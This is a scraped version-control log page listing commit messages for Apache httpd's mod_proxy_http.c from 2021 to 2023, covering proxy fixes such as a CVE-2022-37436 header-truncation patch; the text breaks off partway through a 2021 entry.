*Tue Aug 24 06:55:44 1999 UTC*
(25 years, 5 months ago)
by *fielding*

File length: 37415 byte(s)
```

Apache 1.3.9 baseline for the Apache 2.0 repository.

Obtained from: Apache 1.3.9 (minus unused files), tag APACHE_1_3_9
Submitted by: Apache Group

```

---

This form allows you to request diffs between any two revisions of this file.
For each of the two "sides" of the diff,
enter a numeric revision.

|  | Diffs between  and |
| --- | --- |
|  | Type of Diff should be a Colored Diff Long Colored Diff Full Colored Diff Unidiff Context Diff Side by Side |

---

| infrastructure at apache.org | **[ViewVC Help](/vc-static/help_log.html)** |
| --- | --- |
| Powered by [ViewVC 1.1.26](http://viewvc.tigris.org/) |  |



=== Content from svn.apache.org_115a27fc_20250125_143723.html ===


| **[/](/viewvc?view=roots)[[Apache-SVN]](/viewvc/)/[httpd](/viewvc/httpd/)/[httpd](/viewvc/httpd/httpd/)/[trunk](/viewvc/httpd/httpd/trunk/)/[modules](/viewvc/httpd/httpd/trunk/modules/)/[proxy](/viewvc/httpd/httpd/trunk/modules/proxy/)/mod\_proxy\_http.c** |  |
| --- | --- |

[![ViewVC logotype](/vc-static/images/viewvc-logo.png)](http://www.viewvc.org/ "ViewVC Home")
# Log of /httpd/httpd/trunk/modules/proxy/mod\_proxy\_http.c

[![Parent Directory](/vc-static/images/back_small.png) Parent Directory](/viewvc/httpd/httpd/trunk/modules/proxy/)
| [![Revision Log](/vc-static/images/log.png) Revision Log](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log)

---

| Links to HEAD: | ([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=markup)) ([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=co)) ([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=annotate)) |
| --- | --- |
| Sticky Revision: |  |

---

Revision [**1912459**](/viewvc?view=revision&revision=1912459) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1912459&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1912459&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1912459))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1912459)

Modified
*Thu Sep 21 13:15:35 2023 UTC*
(16 months ago)
by *ylavic*

File length: 87140 byte(s)

Diff to [previous 1908827](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908827&r2=1912459)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908827&r2=1912459&diff_format=h))
```
mod_proxy: Handle backend address renewal with address_ttl= parameter.

Define a new proxy_address struct holding the current/latest sockaddr in use
by each proxy worker and conn. Since backend addresses can be updated when
their TTL expires and while connections are being processed, each address is
refcounted and freed only when the last worker (or conn) using it grabs the
new one.

The lifetime of the addresses is handled at a single place by the new
ap_proxy_determine_address() function. It guarantees to bind the current/latest
backend address to the passed in conn (or do nothing if it's up to date already).
The function is called indirectly by ap_proxy_determine_connection() for the
proxy modules that use it, or directly by mod_proxy_ftp and mod_proxy_hcheck.
It also is called eventually by ap_proxy_connect_backend() when connect()ing all
the current addresses fails, to check (PROXY_DETERMINE_ADDRESS_CHECK) if some
new addrs are available.

This commit is also a rework of the lifetime of conn->addr, conn->hostname
and conn->forward, using the conn->uds_pool and conn->fwd_pool for the cases
where the backend is connected through a UDS socket and a remote CONNECT proxy
respectively.

* include/ap_mmn.h:
  Minor bump for new function/fields.

* modules/proxy/mod_proxy.h (struct proxy_address,
                             ap_proxy_determine_addresss()):
  Declare ap_proxy_determine_addresss() and opaque struct proxy_address,
  new fields to structs proxy_conn_rec/proxy_worker_shared/proxy_worker.

* modules/proxy/mod_proxy.c (set_worker_param):
  Parse/set the new worker->address_ttl parameter.

* modules/proxy/proxy_util.c (proxy_util_register_hooks(),
                              ap_proxy_initialize_worker(),
                              ap_proxy_connection_reusable(),
                              ap_proxyerror(), proxyerror_core(),
                              init_conn_pool(), make_conn_subpool(),
                              connection_make(), connection_cleanup(),
                              connection_constructor()):
 Initialize *proxy_start_time in proxy_util_register_hooks() as the epoch
 from which expiration times are relative (i.e. seconds stored in an uint32_t
 for atomic changes).
 Make sure worker->s->is_address_reusable and worker->s->disablereuse are
 consistant in ap_proxy_initialize_worker(), thus no need to check for both
 in ap_proxy_connection_reusable().
 New proxyerror_core() helper taking an apr_status_t to log, wrap in
 ap_proxyerror().
 New make_conn_subpool() to create worker->cp->{pool,dns} with their own
 allocator.
 New connection_make() helper to factorize code in connection_cleanup() and
 connection_constructor().

* modules/proxy/proxy_util.c (proxy_address_inc(), proxy_address_dec(),
                              proxy_address_cleanup(), proxy_address_set_expired(),
                              worker_address_get(), worker_address_set(),
                              worker_address_resolve(), proxy_addrs_equal(),
                              ap_proxy_determine_address(),
                              ap_proxy_determine_connection(),
                              ap_proxy_connect_backend()):
 Implement ap_proxy_determine_address() using the above helpers for atomic changes,
 and call it from ap_proxy_determine_connection() and ap_proxy_connect_backend().

* modules/proxy/mod_proxy_ftp.c (proxy_ftp_handler):
  Use ap_proxy_determine_address() and use the returned backend->addr.

* modules/proxy/mod_proxy_hcheck.c (hc_determine_connection, hc_get_backend,
                                    hc_init_worker, hc_watchdog_callback):
  Use ap_proxy_determine_address() in hc_determine_connection() and call the
  latter from hc_get_backend(), replace hc_init_worker() by hc_init_baton()
  which now calls hc_get_hcworker() and hc_get_backend() to resolve the first
  address at init time.

* modules/proxy/mod_proxy_http.c (proxy_http_handler):
  Use backend->addr and ->hostname instead of worker->cp->addr and
  worker->s->hostname_ex respectively.

* modules/proxy/mod_proxy_ajp.c (ap_proxy_ajp_request):
  Use backend->addr and ->hostname instead of worker->cp->addr and
  worker->s->hostname_ex respectively.

Closes #367

```

---

Revision [**1908827**](/viewvc?view=revision&revision=1908827) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908827&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908827&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1908827))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1908827)

Modified
*Fri Mar 31 00:11:02 2023 UTC*
(21 months, 3 weeks ago)
by *ylavic*

File length: 87185 byte(s)

Diff to [previous 1908628](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908628&r2=1908827)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908628&r2=1908827&diff_format=h))
```
mod_proxy: Check for space/ctrls in nocanon path/urls before forwarding.

```

---

Revision [**1908628**](/viewvc?view=revision&revision=1908628) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908628&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908628&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1908628))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1908628)

Modified
*Wed Mar 22 08:01:31 2023 UTC*
(22 months ago)
by *rpluem*

File length: 86930 byte(s)

Diff to [previous 1908341](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908341&r2=1908628)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908341&r2=1908628&diff_format=h))
```
* Whitespace fixes. No functional change.

```

---

Revision [**1908341**](/viewvc?view=revision&revision=1908341) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908341&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908341&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1908341))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1908341)

Modified
*Mon Mar 13 10:24:30 2023 UTC*
(22 months, 2 weeks ago)
by *rpluem*

File length: 86931 byte(s)

Diff to [previous 1908257](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908257&r2=1908341)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908257&r2=1908341&diff_format=h))
```
Do not double encode encoded slashes

In case that AllowEncodedSlashes is set to NoDecode do not double encode
encoded slashes in the URL sent by the reverse proxy to the backend.

* include/ap_mmn.h: Document the addition of ap_proxy_canonenc_ex to the API.

* modules/proxy/mod_proxy.h: Declare ap_proxy_canonenc_ex and define flag
      values.

* modules/proxy/proxy_util.c: Implement ap_proxy_canonenc_ex by modifying
      ap_proxy_canonenc accordingly and reimplement ap_proxy_canonenc to
      use ap_proxy_canonenc_ex with the appropriate flag.

* modules/http2/mod_proxy_http2.c, modules/proxy/mod_proxy_*.c: Set the
      correct flag based on the AllowEncodedSlashes configuration and use
      ap_proxy_canonenc_ex instead of ap_proxy_canonenc.

```

---

Revision [**1908257**](/viewvc?view=revision&revision=1908257) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908257&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908257&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1908257))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1908257)

Modified
*Fri Mar 10 21:02:31 2023 UTC*
(22 months, 2 weeks ago)
by *ylavic*

File length: 86716 byte(s)

Diff to [previous 1908095](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908095&r2=1908257)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1908095&r2=1908257&diff_format=h))
```
mod_proxy: Check the query-string for proxy-noencode too.

Follow up to [r1907972](/viewvc?view=revision&revision=1907972) and [r1908095](/viewvc?view=revision&revision=1908095).

```

---

Revision [**1908095**](/viewvc?view=revision&revision=1908095) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908095&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1908095&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1908095))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1908095)

Modified
*Sun Mar 5 20:27:11 2023 UTC*
(22 months, 3 weeks ago)
by *covener*

File length: 86758 byte(s)

Diff to [previous 1907972](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1907972&r2=1908095)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1907972&r2=1908095&diff_format=h))
```
don't forward invalid query strings

Submitted by: rpluem

```

---

Revision [**1907972**](/viewvc?view=revision&revision=1907972) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1907972&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1907972&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1907972))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1907972)

Modified
*Thu Mar 2 14:30:20 2023 UTC*
(22 months, 3 weeks ago)
by *ylavic*

File length: 86276 byte(s)

Diff to [previous 1906539](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1906539&r2=1907972)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1906539&r2=1907972&diff_format=h))
```
mod_proxy: Don't decode r->uri and reencode in r->filename for mapping=encoded.

Decoding was not done for mapping=servlet only (a subset), but overlooked for
mapping=encoded. To avoid double-encoding in the canon_handler hook, use a new
"proxy-noencode" (similarly to "proxy-nocanon") entry in r->notes.

* proxy/mod_proxy.c(ap_proxy_trans_match):
  Set "proxy-noencode" in r->notes for PROXYPASS_MAP_ENCODED, and return DONE
  to avoid decoding in ap_process_request_internal().

* proxy/mod_proxy_http.c, proxy/mod_proxy_ajp.c, proxy/mod_proxy_wstunnel.c,
  proxy/mod_proxy_fcgi.c, proxy/mod_proxy_ajp.c, http2/mod_proxy_http2.c:
  Don't process the url through ap_proxy_canonenc() in canon_handler if
  "proxy-noencode" is set.

```

---

Revision [**1906539**](/viewvc?view=revision&revision=1906539) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1906539&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1906539&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1906539))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1906539)

Modified
*Tue Jan 10 13:18:26 2023 UTC*
(2 years ago)
by *covener*

File length: 86109 byte(s)

Diff to [previous 1901446](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1901446&r2=1906539)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1901446&r2=1906539&diff_format=h))
```
SECURITY: CVE-2022-37436 (cve.mitre.org)

Prior to Apache HTTP Server 2.4.55, a malicious backend can
cause the response headers to be truncated early, resulting in
some headers being incorporated into the response body. If the
later headers have any security purpose, they will not be
interpreted by the client.

fail on bad header

```

---

Revision [**1901446**](/viewvc?view=revision&revision=1901446) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1901446&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1901446&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1901446))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1901446)

Modified
*Tue May 31 11:05:41 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 85843 byte(s)

Diff to [previous 1901420](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1901420&r2=1901446)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1901420&r2=1901446&diff_format=h))
```
mod_proxy_http: Follow up to [r1901420](/viewvc?view=revision&revision=1901420): consistent 100-continue checks.

Let proxy_http_handler() tell ap_proxy_create_hdrbrgd() whether to add or
preserve Expect header or not, through the "proxy-100-continue" note.

```

---

Revision [**1901420**](/viewvc?view=revision&revision=1901420) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1901420&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1901420&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1901420))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1901420)

Modified
*Mon May 30 15:54:34 2022 UTC*
(2 years, 7 months ago)
by *ylavic*

File length: 85703 byte(s)

Diff to [previous 1900028](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1900028&r2=1901420)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1900028&r2=1901420&diff_format=h))
```
mod_proxy_http: Avoid 417 responses for non forwardable 100-continue. PR 65666.

Stop returning 417 when mod_proxy has to forward an HTTP/1.1 request with both
"Expect: 100-continue" and "force-proxy-request-1.0" set, mod_proxy can instead
handle the 100-continue by itself before forwarding the request, like in the
"Proxy100Continue Off" case.

Note that this does not change the behaviour of httpd receiving an HTTP/1.0
request with an Expect header, ap_check_request_header() will still correctly
return 417 in this case.

```

---

Revision [**1900028**](/viewvc?view=revision&revision=1900028) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1900028&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1900028&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1900028))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1900028)

Modified
*Tue Apr 19 09:14:10 2022 UTC*
(2 years, 9 months ago)
by *rjung*

File length: 85758 byte(s)

Diff to [previous 1899584](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899584&r2=1900028)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899584&r2=1900028&diff_format=h))
```
  *) mod_proxy: Add backend port to log messages to
     ease identification of involved service.

```

---

Revision [**1899584**](/viewvc?view=revision&revision=1899584) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899584&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899584&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1899584))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1899584)

Modified
*Tue Apr 5 14:18:09 2022 UTC*
(2 years, 9 months ago)
by *rpluem*

File length: 85703 byte(s)

Diff to [previous 1899564](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899564&r2=1899584)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899564&r2=1899584&diff_format=h))
```
* Report a broken backend in case reading the response line failed on the
  first request on this connection otherwise we assume we have just run
  into a keepalive race and the backend is still healthy.

```

---

Revision [**1899564**](/viewvc?view=revision&revision=1899564) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899564&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899564&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1899564))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1899564)

Modified
*Mon Apr 4 16:00:58 2022 UTC*
(2 years, 9 months ago)
by *rpluem*

File length: 84853 byte(s)

Diff to [previous 1899552](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899552&r2=1899564)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899552&r2=1899564&diff_format=h))
```
* Keep track of the number of keepalives we processed on this connection.

```

---

Revision [**1899552**](/viewvc?view=revision&revision=1899552) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899552&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899552&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1899552))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1899552)

Modified
*Mon Apr 4 11:08:58 2022 UTC*
(2 years, 9 months ago)
by *icing*

File length: 84632 byte(s)

Diff to [previous 1899550](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899550&r2=1899552)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1899550&r2=1899552&diff_format=h))
```
  *) mod_http: genereate HEADERS buckets for trailers
     mod_proxy: forward trailers on chunked request encoding
     test: add http/1.x test cases in pytest

```

---

Revision [**1899550**](/viewvc?view=revision&revision=1899550) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899550&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1899550&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1899550))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1899550)

Modified
*Mon Apr 4 09:41:25 2022 UTC*
(2 years, 9 months ago)
by *icing*

File length: 84989 byte(s)

Diff to [previous 1895715](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1895715&r2=1899550)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1895715&r2=1899550&diff_format=h))
```
  *) core: add ap_h1_append_header() for single header values.
  *) mod_proxy: use of new ap_h1_header(s) functions for
     formatting HTTP/1.1 requests.

```

---

Revision [**1895715**](/viewvc?view=revision&revision=1895715) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1895715&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1895715&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1895715))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1895715)

Modified
*Thu Dec 9 07:40:25 2021 UTC*
(3 years, 1 month ago)
by *rpluem*

File length: 85463 byte(s)

Diff to [previous 1893595](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1893595&r2=1895715)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1893595&r2=1895715&diff_format=h))
```
* Do not change the status code after we already sent it to the client.
  Changing the status code after we sent it to the client causes a status
  code being logged that is different from the one sent to the client which
  can be confusing.

```

---

Revision [**1893595**](/viewvc?view=revision&revision=1893595) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1893595&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1893595&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1893595))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1893595)

Modified
*Fri Sep 24 11:25:42 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 85557 byte(s)

Diff to [previous 1893594](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1893594&r2=1893595)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1893594&r2=1893595&diff_format=h))
```
mod_proxy: Handle ap_proxy_buckets_lifetime_transform() errors.

* modules/proxy/mod_proxy.h,modules/proxy/proxy_util.c:
  Add ap_proxy_fill_error_brigade() to factorize proxy error handling
  on the client connection side.

* modules/proxy/mod_proxy_{http,ajp,uwsgi}.c:
  Use ap_proxy_fill_error_brigade() where needed, including when an
  empty brigade is returned on the backend side or when calling
  ap_proxy_buckets_lifetime_transform fails.

```

---

Revision [**1893594**](/viewvc?view=revision&revision=1893594) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1893594&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1893594&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1893594))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1893594)

Modified
*Fri Sep 24 10:27:16 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 84828 byte(s)

Diff to [previous 1892563](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1892563&r2=1893594)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1892563&r2=1893594&diff_format=h))
```
mod_proxy: Restore ap_proxy_transfer_between_connections().

* modules/proxy/mod_proxy.h:
  Restore the interface of ap_proxy_transfer_between_connections() back to
  before MMN 20210506.0.
  Add ap_proxy_tunnel_conn_bytes_in() and ap_proxy_tunnel_conn_bytes_out().
  New proxy_tunnel_conn_t typedef'ed from opaque struct proxy_tunnel_conn.

* modules/proxy/mod_proxy.h(ap_proxy_tunnel_conn_get_read,
                            ap_proxy_tunnel_conn_get_transferred):
  Axed/replaced by ap_proxy_tunnel_conn_bytes_in() and
  ap_proxy_tunnel_conn_bytes_out().

* modules/proxy/proxy_util.c(struct proxy_tunnel_conn):
  Replace "exchanged" by "bytes_in" and "bytes_out".

* modules/proxy/proxy_util.c(proxy_transfer):
  New helper implementing ap_proxy_transfer_between_connections() and
  returning both &bytes_in and &bytes_out.

* modules/proxy/proxy_util.c(ap_proxy_transfer_between_connections):
  Now calls proxy_transfer().

* modules/proxy/proxy_util.c(ap_proxy_tunnel_conn_bytes_in,
                             ap_proxy_tunnel_conn_bytes_out):
  Return tc->bytes_in and tc->bytes_out respectively.

* modules/proxy/proxy_util.c(proxy_tunnel_forward):
  Use proxy_transfer() which updates in->bytes_in, &out->bytes_out.
  tunnel->replied will be updated in proxy_tunnel_run().

* modules/proxy/proxy_util.c(proxy_tunnel_forward):
  Fall through the "done" label in any case to set tunnel->replied based
  on tunnel->client->bytes_out > 0.

* modules/proxy/mod_proxy_http.c(ap_proxy_http_process_response):
  Use ap_proxy_tunnel_conn_bytes_{in,out}() for worker->s->{read,transferred}
  accounting.

* modules/proxy/mod_proxy_http.c(proxy_http_async_finish):
  Update worker->s->{read,transferred} when async too.

```

---

Revision [**1892563**](/viewvc?view=revision&revision=1892563) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1892563&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1892563&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1892563))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1892563)

Modified
*Tue Aug 24 09:31:16 2021 UTC*
(3 years, 5 months ago)
by *ylavic*

File length: 84537 byte(s)

Diff to [previous 1890605](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1890605&r2=1892563)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1890605&r2=1892563&diff_format=h))
```
mod_proxy_http: Avoid a double call to apr_table_get().

* modules/proxy/mod_proxy_http.c (ap_proxy_http_process_response):
  Save a call to apr_table_get(r->headers_out, "Transfer-Encoding").

No functional change.

```

---

Revision [**1890605**](/viewvc?view=revision&revision=1890605) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1890605&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1890605&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1890605))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1890605)

Modified
*Tue Jun 8 14:37:44 2021 UTC*
(3 years, 7 months ago)
by *icing*

File length: 84605 byte(s)

Diff to [previous 1889550](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1889550&r2=1890605)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1889550&r2=1890605&diff_format=h))
```
  *) core/mod_proxy/mod_ssl:
     Adding `outgoing` flag to conn_rec, indicating a connection is
     initiated by the server to somewhere, in contrast to incoming
     connections from clients.
     Adding 'ap_ssl_bind_outgoing()` function that marks a connection
     as outgoing and is used by mod_proxy instead of the previous
     optional function `ssl_engine_set`. This enables other SSL
     module to secure proxy connections.
     The optional functions `ssl_engine_set`, `ssl_engine_disable` and
     `ssl_proxy_enable` are now provided by the core to have backward
     compatibility with non-httpd modules that might use them. mod_ssl
     itself no longer registers these functions, but keeps them in its
     header for backward compatibility.
     The core provided optional function wrap any registered function
     like it was done for `ssl_is_ssl`.

```

---

Revision [**1889550**](/viewvc?view=revision&revision=1889550) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1889550&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1889550&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1889550))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1889550)

Modified
*Thu May 6 06:25:09 2021 UTC*
(3 years, 8 months ago)
by *jfclere*

File length: 84600 byte(s)

Diff to [previous 1886151](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1886151&r2=1889550)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1886151&r2=1889550&diff_format=h))
```
Allow the tunnelled connections to report the
read and trasnfered to the back-end worker.

```

---

Revision [**1886151**](/viewvc?view=revision&revision=1886151) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1886151&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1886151&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1886151))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1886151)

Modified
*Wed Feb 3 11:29:10 2021 UTC*
